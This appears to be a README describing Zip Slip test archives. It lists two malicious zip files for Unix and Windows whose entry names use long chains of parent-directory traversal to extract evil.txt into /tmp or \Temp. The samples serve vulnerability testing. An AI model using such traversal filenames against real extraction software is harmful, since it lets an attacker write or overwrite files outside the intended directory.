# Zip Slip sample archives

For your reference and testing, here are two sample examples of malicious zip and tar files (for both unix and windows files systems) with filenames that break the target directory and extract a file to the /tmp/ or \Temp\ folders.

```bash
$ 7z l zip-slip.zip

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/evil.txt
------------------- ----- ------------ ------------  ------------------------
2018-04-15 22:04:42                 39           39  2 files
```


```bash
$ 7z l zip-slip-win.zip

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Temp\evil.txt
------------------- ----- ------------ ------------  ------------------------
2018-04-15 22:04:42                 39           39  2 files
```
